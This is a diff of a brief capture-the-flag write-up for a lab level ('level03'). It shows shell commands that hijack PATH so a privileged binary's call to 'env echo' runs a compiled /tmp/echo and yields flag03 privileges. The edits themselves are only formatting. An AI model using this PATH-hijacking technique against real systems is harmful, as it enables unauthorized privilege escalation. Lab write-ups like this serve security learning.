@@ -1,5 +1,5 @@
 Here, we see a binary that asks us to exploit it. Ok.
-Objdump or gdb aren't even needed (?!). A simple cat on it shows
+Objdump or gdb aren't even needed. A simple cat on it shows
 it calls /usr/bin/env echo to display the "Exploit me" string.
 
 Thus, if we modify our path, we can make it excecute our code with
@@ -8,13 +8,13 @@ Thus, we write a little program in c (Ressources/exploit.c), and then change our
 $PATH to include tmp in first position. We then compile the exploit, name it echo,
 run level03 and... tadaaah ! We are flag03.
 
-$>chmod 700 /home/user/level03
-$>setfacl -d -m u::rwx /home/user/level03
+$> chmod 700 /home/user/level03
+$> setfacl -d -m u::rwx /home/user/level03
 
-$>gcc exploit.c -o /tmp/echo
-$>export PATH=/tmp
-$>./level03
+$> gcc exploit.c -o /tmp/echo
+$> export PATH=/tmp
+$> ./level03
 
-flag03$> /bin/getflag
+(flag03)$> /bin/getflag
 
 Now, we can get the next flag.
